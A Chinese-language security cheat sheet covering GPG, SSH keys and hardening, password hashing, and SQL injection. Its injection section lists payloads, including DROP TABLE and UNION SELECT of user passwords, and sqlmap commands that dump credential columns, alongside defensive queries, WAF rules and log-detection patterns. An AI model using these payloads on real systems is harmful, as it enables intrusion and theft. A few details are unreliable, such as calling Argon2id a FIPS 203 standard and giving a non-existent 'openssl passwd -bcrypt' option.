`gpg -o <输出文件> -d <文件>`
```bash
# 解密并保存到指定文件
gpg -o decrypted.txt -d secret.txt.gpg
```

**基本写法：解密对称加密文件**
`gpg -d <文件>`
```bash
# 解密对称加密的文件
gpg -d secret.txt.gpg > decrypted.txt
```

---

## 数字签名

**基本写法：签名文件**
`gpg -s <文件>`
```bash
# 为文件创建签名
gpg -s document.txt
```

**基本写法：分离签名**
`gpg -b <文件>`
```bash
# 创建分离的签名文件
gpg -b document.txt
```

**基本写法：清除签名**
`gpg --clearsign <文件>`
```bash
# 创建清除签名（签名嵌入文本）
gpg --clearsign document.txt
```

**基本写法：验证签名**
`gpg --verify <签名文件>`
```bash
# 验证文件签名
gpg --verify document.txt.sig
```

**基本写法：验证分离签名**
`gpg --verify <签名文件> <原文件>`
```bash
# 验证分离的签名
gpg --verify document.txt.sig document.txt
```

**基本写法：验证清除签名**
`gpg --verify <文件>`
```bash
# 验证清除签名的文件
gpg --verify document.txt.asc
```

---

## 密钥服务器

**基本写法：发送密钥到服务器**
`gpg --send-keys <密钥ID> --keyserver <服务器>`
```bash
# 上传公钥到密钥服务器
gpg --send-keys ABC12345 --keyserver keys.gnupg.net
```

**基本写法：从服务器接收密钥**
`gpg --recv-keys <密钥ID>`
```bash
# 从密钥服务器下载公钥
gpg --recv-keys ABC12345
```

**基本写法：搜索密钥**
`gpg --search-keys <关键词>`
```bash
# 在密钥服务器搜索
gpg --search-keys user@example.com
```

**基本写法：刷新密钥**
`gpg --refresh-keys`
```bash
# 从服务器刷新本地密钥
gpg --refresh-keys
```

---

## 信任管理

**基本写法：编辑密钥信任度**
`gpg --edit-key <用户ID>`
```bash
# 交互式编辑密钥信任级别
gpg --edit-key user@example.com
# 然后输入 trust 命令
```

**基本写法：签名公钥**
`gpg --sign-key <用户ID>`
```bash
# 为他人公钥签名表示信任
gpg --sign-key user@example.com
```

**基本写法：检查签名**
`gpg --check-sigs <用户ID>`
```bash
# 查看密钥的签名情况
gpg --check-sigs user@example.com
```

---

## 加密目录

**基本写法：加密整个目录**
`tar czf - <目录> | gpg -c > <文件>`
```bash
# 压缩并加密整个目录
tar czf - /secret | gpg -c > secret.tar.gz.gpg
```

**基本写法：解密并解压目录**
`gpg -d <文件> | tar xzf -`
```bash
# 解密并解压目录
gpg -d secret.tar.gz.gpg | tar xzf - -C /restore
```

**基本写法：使用公钥加密目录**
`tar czf - <目录> | gpg -e -r <接收者> > <文件>`
```bash
# 压缩并用公钥加密目录
tar czf - /data | gpg -e -r user@example.com > data.tar.gz.gpg
```

---

## 批处理操作

**基本写法：批量加密**
`for f in *.txt; do gpg -e -r <接收者> "$f"; done`
```bash
# 批量加密所有 txt 文件
for f in *.txt; do gpg -e -r user@example.com "$f"; done
```

**基本写法：批量解密**
`for f in *.gpg; do gpg -d "$f" > "${f%.gpg}"; done`
```bash
# 批量解密所有 gpg 文件
for f in *.gpg; do gpg -d "$f" > "${f%.gpg}"; done
```

**基本写法：无交互加密**
`gpg --batch --yes -e -r <接收者> <文件>`
```bash
# 批处理模式无交互加密
gpg --batch --yes -e -r user@example.com secret.txt
```

---

## 实用 GPG 组合

**基本写法：安全删除原文件**
`gpg -c <文件> && shred -u <文件>`
```bash
# 加密后安全删除原文件
gpg -c secret.txt && shred -u secret.txt
```

**基本写法：验证并解密**
`gpg --verify <签名> && gpg -d <文件>`
```bash
# 先验证签名再解密
gpg --verify document.sig && gpg -d document.gpg
```

**基本写法：加密邮件内容**
`gpg -a -e -r <接收者> <邮件文件>`
```bash
# 加密邮件内容为 ASCII 格式
gpg -a -e -r recipient@example.com email.txt
```

**基本写法：备份 GPG 密钥**
`gpg --export-secret-keys -a > <文件>; gpg --export -a >> <文件>`
```bash
# 备份所有 GPG 密钥到文件
gpg --export-secret-keys -a > backup.key
gpg --export -a >> backup.key
```



<!-- ============ 文档分隔线：033-cybersecurity/042-SSHKeys.md ============ -->


## ssh-keygen 密钥生成

**基本写法：生成 RSA 密钥**
`ssh-keygen -t rsa -b <位数>`
```bash
# 生成 4096 位 RSA 密钥
ssh-keygen -t rsa -b 4096
```

**基本写法：生成 Ed25519 密钥**
`ssh-keygen -t ed25519`
```bash
# 生成 Ed25519 密钥（推荐）
ssh-keygen -t ed25519 -C "user@example.com"
```

**基本写法：生成 ECDSA 密钥**
`ssh-keygen -t ecdsa -b <位数>`
```bash
# 生成 521 位 ECDSA 密钥
ssh-keygen -t ecdsa -b 521
```

**基本写法：指定密钥文件名**
`ssh-keygen -f <文件名>`
```bash
# 指定密钥文件路径
ssh-keygen -t ed25519 -f ~/.ssh/deploy_key
```

**基本写法：生成无密码密钥**
`ssh-keygen -t rsa -N ""`
```bash
# 生成无密码的密钥（用于自动化）
ssh-keygen -t rsa -b 4096 -N "" -f ~/.ssh/auto_key
```

**基本写法：添加注释**
`ssh-keygen -t ed25519 -C "<注释>"`
```bash
# 添加注释标识密钥用途
ssh-keygen -t ed25519 -C "production-deploy-2026"
```

---

## 密钥管理

**基本写法：查看密钥指纹**
`ssh-keygen -l -f <公钥>`
```bash
# 查看公钥指纹
ssh-keygen -l -f ~/.ssh/id_rsa.pub
```

**基本写法：查看密钥指纹（SHA256）**
`ssh-keygen -l -E sha256 -f <公钥>`
```bash
# 查看 SHA256 格式指纹
ssh-keygen -l -E sha256 -f ~/.ssh/id_rsa.pub
```

**基本写法：查看密钥图形指纹**
`ssh-keygen -l -v -f <公钥>`
```bash
# 查看随机图形指纹
ssh-keygen -l -v -f ~/.ssh/id_rsa.pub
```

**基本写法：修改密钥密码**
`ssh-keygen -p -f <私钥>`
```bash
# 修改私钥的密码
ssh-keygen -p -f ~/.ssh/id_rsa
```

**基本写法：移除密钥密码**
`ssh-keygen -p -N "" -f <私钥>`
```bash
# 移除私钥密码
ssh-keygen -p -N "" -f ~/.ssh/id_rsa
```

---

## 密钥转换与导出

**基本写法：从私钥提取公钥**
`ssh-keygen -y -f <私钥>`
```bash
# 从私钥提取公钥
ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub
```

**基本写法：转换密钥格式**
`ssh-keygen -p -m PEM -f <私钥>`
```bash
# 将密钥转换为 PEM 格式
ssh-keygen -p -m PEM -f ~/.ssh/id_rsa
```

**基本写法：生成 RFC4716 格式公钥**
`ssh-keygen -e -m RFC4716 -f <公钥>`
```bash
# 转换为 RFC4716 格式
ssh-keygen -e -m RFC4716 -f ~/.ssh/id_rsa.pub
```

**基本写法：从 RFC4716 转换回 OpenSSH**
`ssh-keygen -i -m RFC4716 -f <文件>`
```bash
# 从 RFC4716 格式导入
ssh-keygen -i -m RFC4716 -f public.key
```

---

## ssh-copy-id 部署公钥

**基本写法：复制公钥到远程**
`ssh-copy-id <用户>@<主机>`
```bash
# 部署公钥到远程主机
ssh-copy-id user@192.168.1.1
```

**基本写法：指定公钥文件**
`ssh-copy-id -i <公钥> <用户>@<主机>`
```bash
# 指定公钥文件部署
ssh-copy-id -i ~/.ssh/my_key.pub user@192.168.1.1
```

**基本写法：指定端口**
`ssh-copy-id -p <端口> <用户>@<主机>`
```bash
# 指定 SSH 端口
ssh-copy-id -p 2222 user@192.168.1.1
```

**基本写法：指定 SSH 选项**
`ssh-copy-id -o "<选项>" <用户>@<主机>`
```bash
# 传递 SSH 选项
ssh-copy-id -o "StrictHostKeyChecking=no" user@192.168.1.1
```

---

## known_hosts 管理

**基本写法：查看 known_hosts**
`cat ~/.ssh/known_hosts`
```bash
# 查看 known_hosts 文件内容
cat ~/.ssh/known_hosts
```

**基本写法：删除主机记录**
`ssh-keygen -R <主机>`
```bash
# 删除指定主机的记录
ssh-keygen -R 192.168.1.1
```

**基本写法：查看主机指纹**
`ssh-keygen -F <主机>`
```bash
# 查看 known_hosts 中主机的指纹
ssh-keygen -F 192.168.1.1
```

**基本写法：哈希 known_hosts**
`ssh-keygen -H`
```bash
# 哈希 known_hosts 文件中的主机名
ssh-keygen -H -f ~/.ssh/known_hosts
```

**基本写法：验证主机密钥**
`ssh-keygen -F <主机> -l`
```bash
# 查看主机密钥指纹
ssh-keygen -F github.com -l
```

---

## ssh-agent 代理

**基本写法：启动 ssh-agent**
`eval $(ssh-agent)`
```bash
# 启动 ssh-agent
eval $(ssh-agent)
```

**基本写法：添加密钥到 agent**
`ssh-add <私钥>`
```bash
# 添加私钥到 agent
ssh-add ~/.ssh/id_rsa
```

**基本写法：添加所有默认密钥**
`ssh-add`
```bash
# 添加默认密钥
ssh-add
```

**基本写法：列出已添加的密钥**
`ssh-add -l`
```bash
# 列出 agent 中的密钥指纹
ssh-add -l
```

**基本写法：列出密钥公钥**
`ssh-add -L`
```bash
# 列出 agent 中的密钥公钥
ssh-add -L
```

**基本写法：删除指定密钥**
`ssh-add -d <私钥>`
```bash
# 从 agent 中删除密钥
ssh-add -d ~/.ssh/id_rsa
```

**基本写法：删除所有密钥**
`ssh-add -D`
```bash
# 清空 agent 中所有密钥
ssh-add -D
```

**基本写法：锁定 agent**
`ssh-add -x`
```bash
# 用密码锁定 agent
ssh-add -x
```

**基本写法：解锁 agent**
`ssh-add -X`
```bash
# 解锁 agent
ssh-add -X
```

---

## SSH 配置文件

**基本写法：配置主机别名**
```sshconfig
`Host <别名>
    HostName <主机>
    User <用户>
    Port <端口>
    IdentityFile <私钥>`
```
```sshconfig
# SSH 配置文件 ~/.ssh/config
Host prod
    HostName 192.168.1.100
    User deploy
    Port 22
    IdentityFile ~/.ssh/prod_key
```

**基本写法：通配符配置**
```sshconfig
`Host *.<域名>
    User <用户>
    IdentityFile <私钥>`
```
```sshconfig
# 配置所有 *.example.com 主机
Host *.example.com
    User admin
    IdentityFile ~/.ssh/work_key
```

**基本写法：安全配置**
```sshconfig
`Host *
    ServerAliveInterval <秒数>
    ServerAliveCountMax <次数>
    StrictHostKeyChecking <yes/no>`
```
```sshconfig
# 全局安全配置
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
    StrictHostKeyChecking yes
```

---

## 证书认证

**基本写法：生成 CA 密钥**
`ssh-keygen -t ed25519 -f <CA密钥>`
```bash
# 生成 SSH CA 密钥
ssh-keygen -t ed25519 -f ~/.ssh/ca_key
```

**基本写法：签名用户公钥**
`ssh-keygen -s <CA密钥> -I <标识> -n <用户> <用户公钥>`
```bash
# 用 CA 签名用户公钥
ssh-keygen -s ~/.ssh/ca_key -I user_alice -n alice ~/.ssh/alice.pub
```

**基本写法：签名主机密钥**
`ssh-keygen -s <CA密钥> -I <标识> -h -n <主机名> <主机公钥>`
```bash
# 用 CA 签名主机密钥
ssh-keygen -s ~/.ssh/ca_key -I host_server1 -h -n server1.example.com /etc/ssh/ssh_host_ed25519_key.pub
```

**基本写法：信任 CA**
`# /etc/ssh/sshd_config`
```bash
# 配置服务器信任 CA
echo "TrustedUserCAKeys /etc/ssh/ca_key.pub" >> /etc/ssh/sshd_config
systemctl restart sshd
```

---

## 安全最佳实践

**基本写法：禁用密码登录**
`# /etc/ssh/sshd_config`
```bash
# 禁用密码认证只允许密钥
sed -i 's/#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd
```

**基本写法：禁止 root 登录**
`# /etc/ssh/sshd_config`
```bash
# 禁止 root 直接登录
sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
systemctl restart sshd
```

**基本写法：限制登录尝试**
`# /etc/ssh/sshd_config`
```bash
# 限制最大认证尝试次数
echo "MaxAuthTries 3" >> /etc/ssh/sshd_config
systemctl restart sshd
```

**基本写法：限制用户组**
`# /etc/ssh/sshd_config`
```bash
# 只允许特定组登录
echo "AllowGroups ssh-users" >> /etc/ssh/sshd_config
systemctl restart sshd
```

**基本写法：设置登录宽限时间**
`# /etc/ssh/sshd_config`
```bash
# 设置登录宽限时间 30 秒
echo "LoginGraceTime 30" >> /etc/ssh/sshd_config
systemctl restart sshd
```



<!-- ============ 文档分隔线：033-cybersecurity/043-PasswordHash.md ============ -->


## bcrypt 哈希

**基本写法：使用 Python 生成 bcrypt 哈希**
`python3 -c "import bcrypt; print(bcrypt.hashpw(b'<密码>', bcrypt.gensalt()).decode())"`
```bash
# 生成 bcrypt 哈希
python3 -c "import bcrypt; print(bcrypt.hashpw(b'mypassword', bcrypt.gensalt(12)).decode())"
```

**基本写法：指定计算成本**
`python3 -c "import bcrypt; print(bcrypt.hashpw(b'<密码>', bcrypt.gensalt(<成本>)).decode())"`
```bash
# 使用成本因子 12（默认 12）
python3 -c "import bcrypt; print(bcrypt.hashpw(b'mypassword', bcrypt.gensalt(14)).decode())"
```

**基本写法：验证 bcrypt 密码**
`python3 -c "import bcrypt; print(bcrypt.checkpw(b'<密码>', b'<哈希>'))"`
```bash
# 验证 bcrypt 密码
python3 -c "import bcrypt; print(bcrypt.checkpw(b'mypassword', b'\$2b\$12\$...'))"
```

**基本写法：使用 htpasswd 生成 bcrypt**
`htpasswd -nbB <用户> <密码>`
```bash
# 使用 Apache htpasswd 生成 bcrypt
htpasswd -nbB admin secret123
```

**基本写法：使用 Node.js 生成 bcrypt**
`node -e "const bcrypt=require('bcrypt'); console.log(bcrypt.hashSync('密码', 12))"`
```bash
# Node.js 生成 bcrypt
node -e "const bcrypt=require('bcrypt'); console.log(bcrypt.hashSync('mypassword', 12))"
```

---

## Argon2 哈希

**基本写法：使用 argon2 命令行工具**
`argon2 <盐> -id -t <迭代次数> -m <内存> -p <并行数> -l <长度>`
```bash
# 使用 argon2 生成哈希
echo -n "mypassword" | argon2 somesalt -id -t 3 -m 65536 -p 1 -l 32
```

**基本写法：使用 Python argon2**
`python3 -c "from argon2 import PasswordHasher; ph=PasswordHasher(); print(ph.hash('<密码>'))"`
```bash
# 使用 argon2-cffi 库
python3 -c "from argon2 import PasswordHasher; ph=PasswordHasher(); print(ph.hash('mypassword'))"
```

**基本写法：验证 argon2 密码**
`python3 -c "from argon2 import PasswordHasher; ph=PasswordHasher(); print(ph.verify('<哈希>', '<密码>'))"`
```bash
# 验证 argon2 密码
python3 -c "from argon2 import PasswordHasher; ph=PasswordHasher(); print(ph.verify('\$argon2id\$...', 'mypassword'))"
```

**基本写法：使用 Node.js argon2**
`node -e "const argon2=require('argon2'); argon2.hash('密码').then(console.log)"`
```bash
# Node.js 生成 argon2
node -e "const argon2=require('argon2'); argon2.hash('mypassword').then(console.log)"
```

---

## PBKDF2 哈希

**基本写法：使用 Python PBKDF2**
`python3 -c "import hashlib, binascii, os; salt=os.urandom(16); print(binascii.hexlify(hashlib.pbkdf2_hmac('sha256', b'<密码>', salt, <迭代次数>)).decode())"`
```bash
# 使用 PBKDF2-SHA256 派生密钥
python3 -c "import hashlib, binascii, os; salt=os.urandom(16); print(binascii.hexlify(hashlib.pbkdf2_hmac('sha256', b'mypassword', salt, 600000)).decode())"
```

**基本写法：使用 OpenSSL PBKDF2**
`openssl kdf -keylen <长度> -kdfopts pass:<密码>:salt:<盐>:iter:<迭代次数> PBKDF2`
```bash
# OpenSSL 生成 PBKDF2 密钥
openssl kdf -keylen 32 -kdfopts pass:password:salt:salt:iter:600000 PBKDF2
```

**基本写法：使用 Django PBKDF2**
`python3 -c "from django.contrib.auth.hashers import PBKDF2PasswordHasher; h=PBKDF2PasswordHasher(); print(h.encode('<密码>', h.salt()))"`
```bash
# Django 风格 PBKDF2 哈希
python3 -c "from django.contrib.auth.hashers import PBKDF2PasswordHasher; h=PBKDF2PasswordHasher(); print(h.encode('mypassword', h.salt()))"
```

---

## scrypt 哈希

**基本写法：使用 OpenSSL scrypt**
`openssl kdf -keylen <长度> -kdfopts pass:<密码>:salt:<盐>:n:<N>:r:<r>:p:<p> scrypt`
```bash
# 使用 scrypt 派生密钥
openssl kdf -keylen 32 -kdfopts pass:password:salt:salt:n:16384:r:8:p:1 scrypt
```

**基本写法：使用 Python scrypt**
`python3 -c "import hashlib; print(hashlib.scrypt(b'<密码>', salt=b'<盐>', n=16384, r=8, p=1, dklen=32).hex())"`
```bash
# Python 生成 scrypt 哈希
python3 -c "import hashlib; print(hashlib.scrypt(b'mypassword', salt=b'salt', n=16384, r=8, p=1, dklen=32).hex())"
```

**基本写法：使用 Node.js scrypt**
`node -e "const crypto=require('crypto'); console.log(crypto.scryptSync('密码', '盐', 64).toString('hex'))"`
```bash
# Node.js 生成 scrypt 哈希
node -e "const crypto=require('crypto'); console.log(crypto.scryptSync('mypassword', 'salt', 64).toString('hex'))"
```

---

## Linux 系统密码哈希

**基本写法：使用 mkpasswd**
`mkpasswd -m <算法> <密码>`
```bash
# 生成 SHA-512 密码哈希
mkpasswd -m sha-512 mypassword
```

**基本写法：使用 openssl 生成 crypt 哈希**
`openssl passwd -6 <密码>`
```bash
# 生成 SHA-512crypt 哈希
openssl passwd -6 mypassword
```

**基本写法：使用 openssl 生成 bcrypt**
`openssl passwd -bcrypt <密码>`
```bash
# 生成 bcrypt 哈希
openssl passwd -bcrypt mypassword
```

**基本写法：使用 Python crypt**
`python3 -c "import crypt; print(crypt.crypt('<密码>', crypt.mksalt(crypt.METHOD_SHA512)))"`
```bash
# 生成 SHA-512crypt 密码哈希
python3 -c "import crypt; print(crypt.crypt('mypassword', crypt.mksalt(crypt.METHOD_SHA512)))"
```

---

## 密码哈希验证

**基本写法：使用 Python crypt 验证**
`python3 -c "import crypt; print(crypt.crypt('<密码>', '<哈希>') == '<哈希>')"`
```bash
# 验证密码哈希
python3 -c "import crypt; print(crypt.crypt('mypassword', '\$6\$...') == '\$6\$...')"
```

**基本写法：使用 openssl 验证**
`openssl passwd -6 -salt <盐> <密码>`
```bash
# 验证密码哈希
openssl passwd -6 -salt abc123 mypassword
```

**基本写法：使用 htpasswd 验证**
`htpasswd -bv <密码文件> <用户> <密码>`
```bash
# 验证 htpasswd 中的密码
htpasswd -bv /etc/nginx/.htpasswd admin secret123
```

---

## Django 密码哈希

**基本写法：使用 Django 生成密码哈希**
`python3 -c "from django.contrib.auth.hashers import make_password; print(make_password('<密码>'))"`
```bash
# Django 生成 PBKDF2 密码哈希
python3 -c "from django.contrib.auth.hashers import make_password; print(make_password('mypassword'))"
```

**基本写法：使用 Django 验证密码**
`python3 -c "from django.contrib.auth.hashers import check_password; print(check_password('<密码>', '<哈希>'))"`
```bash
# Django 验证密码
python3 -c "from django.contrib.auth.hashers import check_password; print(check_password('mypassword', 'pbkdf2_sha256\$...'))"
```

**基本写法：使用 Django Argon2**
`python3 -c "from django.contrib.auth.hashers import make_password; print(make_password('<密码>', hasher='argon2'))"`
```bash
# Django 使用 Argon2 哈希
python3 -c "from django.contrib.auth.hashers import make_password; print(make_password('mypassword', hasher='argon2'))"
```

---

## Spring Security 密码编码

**基本写法：使用 BCryptPasswordEncoder**
```java
`BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
String hash = encoder.encode("密码");
boolean match = encoder.matches("密码", hash);`
```
```java
// Spring Security BCrypt 编码
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hash = encoder.encode("mypassword");
boolean match = encoder.matches("mypassword", hash);
```

**基本写法：使用 Argon2PasswordEncoder**
```java
`Argon2PasswordEncoder encoder = new Argon2PasswordEncoder();
String hash = encoder.encode("密码");`
```
```java
// Spring Security Argon2 编码
Argon2PasswordEncoder encoder = new Argon2PasswordEncoder();
String hash = encoder.encode("mypassword");
```

---

## Node.js 密码哈希

**基本写法：使用 bcrypt**
`node -e "const bcrypt=require('bcrypt'); bcrypt.hash('密码', 12).then(console.log)"`
```bash
# Node.js bcrypt 哈希
node -e "const bcrypt=require('bcrypt'); bcrypt.hash('mypassword', 12).then(console.log)"
```

**基本写法：验证 bcrypt**
`node -e "const bcrypt=require('bcrypt'); bcrypt.compare('密码', '哈希').then(console.log)"`
```bash
# Node.js 验证 bcrypt
node -e "const bcrypt=require('bcrypt'); bcrypt.compare('mypassword', '\$2b\$...').then(console.log)"
```

**基本写法：使用 scrypt**
`node -e "const crypto=require('crypto'); const hash=crypto.scryptSync('密码','盐',64).toString('hex'); console.log(hash)"`
```bash
# Node.js 内置 scrypt
node -e "const crypto=require('crypto'); const hash=crypto.scryptSync('mypassword','salt',64).toString('hex'); console.log(hash)"
```

---

## 密码强度检测

**基本写法：检查密码长度**
`python3 -c "p='<密码>'; print(len(p) >= 12 and '足够' or '不足')"`
```bash
# 检查密码长度是否至少 12 位
python3 -c "p='mypassword'; print('OK' if len(p) >= 12 else 'Too short')"
```

**基本写法：检查密码复杂度**
`python3 -c "import re; p='<密码>'; print(bool(re.match(r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@\$!%*?&]).{12,}$', p)))"`
```bash
# 检查密码是否包含大小写字母数字特殊字符
python3 -c "import re; p='MyP@ssw0rd2026'; print(bool(re.match(r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@\$!%*?&]).{12,}$', p)))"
```

**基本写法：使用 passlib 检测**
`python3 -c "from passlib.hash import bcrypt; print(bcrypt.using(rounds=12).hash('<密码>'))"`
```bash
# 使用 passlib 库生成 bcrypt
python3 -c "from passlib.hash import bcrypt; print(bcrypt.using(rounds=12).hash('mypassword'))"
```

---

## 密码哈希最佳实践

**基本写法：推荐算法对比**
```text
`算法       推荐参数                  说明
Argon2id   memory=64MB, iter=3      首选，抗 GPU/ASIC
bcrypt     cost=12+                 成熟可靠
scrypt     N=16384, r=8, p=1        内存困难函数
PBKDF2     iterations=600000+       兼容性最好但较弱`
```
```text
# 密码哈希算法推荐顺序
1. Argon2id（最佳，FIPS 203 标准）
2. bcrypt（成熟，cost >= 12）
3. scrypt（内存困难，N=16384）
4. PBKDF2（兼容性，迭代 >= 600000）
```

**基本写法：弱算法警告**
```text
`已废弃：MD5、SHA1、DES、3DES、RC4
不推荐：直接使用 SHA256 哈希密码
推荐：使用专门的密码哈希函数 bcrypt/Argon2`
```
```bash
# 检查 /etc/shadow 中的哈希算法
grep $USER /etc/shadow | cut -d: -f2 | cut -d$ -f2
```



<!-- ============ 文档分隔线：033-cybersecurity/044-SQLInjection.md ============ -->


## SQL 注入识别

**基本写法：经典注入测试载荷**
```sql
`' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin'#
' OR 1=1 --`
```
```sql
# 经典 SQL 注入测试载荷
' OR '1'='1' --
```

**基本写法：数字型注入测试**
```sql
`1 OR 1=1
1; DROP TABLE users--
1 UNION SELECT NULL--
1 UNION SELECT username, password FROM users--`
```
```sql
# 数字型 SQL 注入测试
1 OR 1=1
1 UNION SELECT username, password FROM users--
```

**基本写法：UNION 注入**
```sql
`' UNION SELECT NULL--
' UNION SELECT username, password FROM users--
' UNION SELECT table_name FROM information_schema.tables--`
```
```sql
# UNION 注入获取数据
' UNION SELECT username, password FROM users--
```

---

## sqlmap 自动化检测

**基本写法：检测 URL 是否存在注入**
`sqlmap -u "<URL>"`
```bash
# 检测目标 URL 是否存在 SQL 注入
sqlmap -u "http://example.com/page?id=1"
```

**基本写法：指定注入参数**
`sqlmap -u "<URL>" -p <参数>`
```bash
# 指定检测 id 参数
sqlmap -u "http://example.com/page?id=1" -p id
```

**基本写法：POST 请求检测**
`sqlmap -u "<URL>" --data "<数据>"`
```bash
# 检测 POST 请求的注入
sqlmap -u "http://example.com/login" --data "username=admin&password=123"
```

**基本写法：使用 Cookie**
`sqlmap -u "<URL>" --cookie="<Cookie>"`
```bash
# 带认证 Cookie 检测
sqlmap -u "http://example.com/page?id=1" --cookie="session=abc123"
```

**基本写法：指定数据库类型**
`sqlmap -u "<URL>" --dbms=<数据库>`
```bash
# 指定数据库类型为 MySQL
sqlmap -u "http://example.com/page?id=1" --dbms=mysql
```

---

## sqlmap 数据提取

**基本写法：枚举数据库**
`sqlmap -u "<URL>" --dbs`
```bash
# 列出所有数据库
sqlmap -u "http://example.com/page?id=1" --dbs
```

**基本写法：枚举表**
`sqlmap -u "<URL>" -D <数据库> --tables`
```bash
# 列出指定数据库的表
sqlmap -u "http://example.com/page?id=1" -D mydb --tables
```

**基本写法：枚举列**
`sqlmap -u "<URL>" -D <数据库> -T <表> --columns`
```bash
# 列出表的列
sqlmap -u "http://example.com/page?id=1" -D mydb -T users --columns
```

**基本写法：导出数据**
`sqlmap -u "<URL>" -D <数据库> -T <表> --dump`
```bash
# 导出表中的所有数据
sqlmap -u "http://example.com/page?id=1" -D mydb -T users --dump
```

**基本写法：导出指定列**
`sqlmap -u "<URL>" -D <数据库> -T <表> -C <列1>,<列2> --dump`
```bash
# 导出指定列的数据
sqlmap -u "http://example.com/page?id=1" -D mydb -T users -C username,password --dump
```

---

## 参数化查询防御

**基本写法：Java 参数化查询**
```java
`String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();`
```
```java
// Java 使用 PreparedStatement 防止 SQL 注入
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();
```

**基本写法：Python 参数化查询**
```python
`cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`
```
```python
# Python 使用参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

**基本写法：Node.js 参数化查询**
```javascript
`db.query('SELECT * FROM users WHERE id = ?', [userId], callback)`
```
```javascript
// Node.js 使用参数化查询
db.query('SELECT * FROM users WHERE id = ?', [userId], (err, results) => {
  // 处理结果
});
```

**基本写法：PHP PDO 参数化**
```php
`$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $userId]);`
```
```php
// PHP PDO 参数化查询
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $userId]);
```

---

## ORM 防御

**基本写法：Hibernate HQL**
```java
`String hql = "FROM User WHERE id = :id";
Query query = session.createQuery(hql);
query.setParameter("id", userId);`
```
```java
// Hibernate 使用命名参数
String hql = "FROM User WHERE id = :id";
Query query = session.createQuery(hql);
query.setParameter("id", userId);
```

**基本写法：Django ORM**
```python
`User.objects.filter(id=user_id)`
```
```python
# Django ORM 自动参数化
User.objects.filter(id=user_id)
```

**基本写法：SQLAlchemy**
```python
`session.query(User).filter(User.id == user_id)`
```
```python
# SQLAlchemy ORM 自动参数化
session.query(User).filter(User.id == user_id)
```

---

## 输入验证

**基本写法：白名单验证**
```python
`import re
if re.match(r'^[0-9]+$', user_id):
    # 安全处理`
```
```python
# 只允许数字的输入验证
import re
if re.match(r'^[0-9]+$', user_id):
    safe_id = int(user_id)
```

**基本写法：类型转换**
```python
`user_id = int(user_id)`
```
```python
# 强制类型转换防止注入
user_id = int(request.args.get('id'))
```

**基本写法：长度限制**
```python
`if len(username) <= 50:
    # 处理输入`
```
```python
# 限制输入长度
username = request.form.get('username', '')[:50]
```

---

## WAF 规则防御

**基本写法：ModSecurity 规则**
```apache
`SecRule ARGS "(?i)(union|select|insert|update|delete|drop)" "id:1001,phase:2,deny,status:403"`
```
```apache
# ModSecurity 防止 SQL 注入
SecRule ARGS "(?i)(union|select|insert|update|delete|drop)" "id:1001,phase:2,deny,status:403"
```

**基本写法：Nginx 防注入规则**
```nginx
`if ($args ~* "union.*select") {
    return 403;
}`
```
```nginx
# Nginx 简单防 SQL 注入
if ($args ~* "union.*select.*from") {
    return 403;
}
```

---

## 日志监控

**基本写法：检测 SQL 注入尝试**
```bash
`grep -iE "union.*select|'--|' or '1'='1" /var/log/nginx/access.log`
```
```bash
# 在日志中检测 SQL 注入特征
grep -iE "union.*select|'--|' or '1'='1|;.*drop" /var/log/nginx/access.log
```

**基本写法：统计可疑 IP**
```bash
`grep -iE "union.*select" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn`
```
```bash
# 统计 SQL 注入尝试的 IP
grep -iE "union.*select|' or '1'='1" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn
```

**基本写法：实时监控注入尝试**
```bash
`tail -f /var/log/nginx/access.log | grep --line-buffered -iE "union.*select|'--"`
```
```bash
# 实时监控 SQL 注入尝试
tail -f /var/log/nginx/access.log | grep --line-buffered -iE "union.*select|'--|' or '1'='1"
```

---

## 数据库最小权限

**基本写法：创建只读用户**
`GRANT SELECT ON <数据库>.<表> TO '<用户>'@'<主机>' IDENTIFIED BY '<密码>';`
```sql
# 创建只读数据库用户
CREATE USER 'webuser'@'localhost' IDENTIFIED BY 'strongpassword';
GRANT SELECT ON mydb.* TO 'webuser'@'localhost';
FLUSH PRIVILEGES;
```

**基本写法：限制 DROP 权限**
`GRANT SELECT, INSERT, UPDATE ON <数据库>.* TO '<用户>'@'<主机>';`
```sql
# 只授予必要权限不含 DROP
GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'webuser'@'localhost';
FLUSH PRIVILEGES;
```

**基本写法：撤销危险权限**
`REVOKE DROP, ALTER ON <数据库>.* FROM '<用户>'@'<主机>';`
```sql
# 撤销 DROP 和 ALTER 权限
REVOKE DROP, ALTER ON mydb.* FROM 'webuser'@'localhost';
FLUSH PRIVILEGES;
```

---

## 错误信息处理

**基本写法：关闭数据库错误显示**
```php
`error_reporting(0);
ini_set('display_errors', 0);`
```
```php
// PHP 关闭错误显示防止信息泄露
error_reporting(0);
ini_set('display_errors', 0);
```

**基本写法：自定义错误页面**
```python
`try:
    cursor.execute(sql)
except Exception as e:
    log_error(e)
    return "服务器错误", 500`
```
```python
# Python 捕获异常返回通用错误
try:
    cursor.execute(sql)
except Exception as e:
    log_error(e)
    return "服务器内部错误", 500
```

**基本写法：Django 隐藏调试信息**
```python
`DEBUG = False
ALLOWED_HOSTS = ['example.com']`
```
```python
# Django 生产环境配置
DEBUG = False
ALLOWED_HOSTS = ['example.com']
```



